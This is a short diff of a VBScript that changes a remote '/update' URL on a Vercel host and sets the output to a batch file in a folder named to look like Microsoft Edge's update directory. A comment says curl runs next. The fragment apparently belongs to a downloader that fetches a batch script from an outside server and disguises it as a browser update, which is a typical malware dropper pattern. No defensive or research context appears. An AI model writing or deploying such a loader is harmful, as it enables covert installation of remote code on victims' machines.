@@ -1,7 +1,7 @@
 Set WshShell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-url = "https://boostagenttest-piw2id08i-euan-thompsons-projects.vercel.app/update"
+url = "https://boostagenttest.vercel.app/update"
 outputFile = "C:/ProgramData/MicrosoftEdge/Updates/UpdateLog/update_check.bat"
 
 ' Run curl and wait for completion
